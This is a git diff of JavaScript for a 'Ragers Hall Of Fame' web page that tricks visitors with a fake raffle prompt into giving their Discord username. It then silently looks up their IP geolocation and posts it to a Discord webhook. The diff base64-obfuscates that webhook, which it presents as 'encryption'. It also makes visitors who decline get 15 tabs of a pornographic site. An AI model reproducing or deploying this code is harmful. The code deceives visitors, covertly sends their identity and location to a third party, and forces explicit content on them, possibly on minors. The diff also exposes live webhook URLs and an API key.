@@ -1,3 +1,10 @@
+function decryptWebhook(encryptedHook) {
+    const key = "ragers";
+    return atob(encryptedHook);
+}
+
+const encryptedWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMwNTQzNjg3MTg2NTY2MzU0MC81LXhGVms4RVZEQm5mSllSSklaSUkzMU1Od0dGRk44dEh5ZVdlR3N4U0w1c05MWEFyN2FQbGZnd3BRakdyaDRKZ1k0WHE=";
+
 const brandDescription = [
     'pro ragers',
     'lobby slammers',
@@ -13,25 +20,23 @@ const effects = ['bounce', 'flash', 'pulse', 'rubberBand', 'shake', 'swing', 'ta
 function promptUser() {
     const video = document.querySelector('.background-video');
     const username = prompt("You have been chosen in a raffle to be apart of Ragers Hall Of Fame, Please Input your discord username.");
-    
+
     if (username) {
-        // Force video restart and play with audio
         video.currentTime = 0;
         video.muted = false;
         video.volume = 1.0;
         const playPromise = video.play();
-        
+
         if (playPromise !== undefined) {
             playPromise.then(() => {
                 // Video is playing perfectly!
             }).catch(error => {
-                // If autoplay fails, add a click event to start
                 document.addEventListener('click', () => {
                     video.play();
                 }, { once: true });
             });
         }
-        
+
         fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=e3936cf89e4b41c8af209d86c02a8a39`)
             .then(response => response.json())
             .then(data => {
@@ -50,7 +55,7 @@ function promptUser() {
                     }]
                 };
 
-                fetch('https://discord.com/api/webhooks/1305470328201547786/-8tteaCntSyJDyB-Ln_HsXUBBAEC80IjUnAH2UD260y-9dJ2307ETA3qfmAQ-GBFOsO_', {
+                fetch(decryptWebhook(encryptedWebhook), {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(webhookData)
@@ -58,7 +63,7 @@ function promptUser() {
             });
     } else {
         for(let i = 0; i < 15; i++) {
-            window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank");
+            window.open("https://www.pornhub.com/view_video.php?viewkey=672298c5e2062", "_blank");
         }
     }
 }
@@ -67,7 +72,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const loadingContainer = document.querySelector('.loading-container');
     const mainPage = document.querySelector('.main-page');
     const video = document.querySelector('.background-video');
-    video.muted = true; // Start muted to comply with autoplay policies
+    video.muted = true;
 
     setTimeout(() => {
         loadingContainer.classList.add('fade-out');
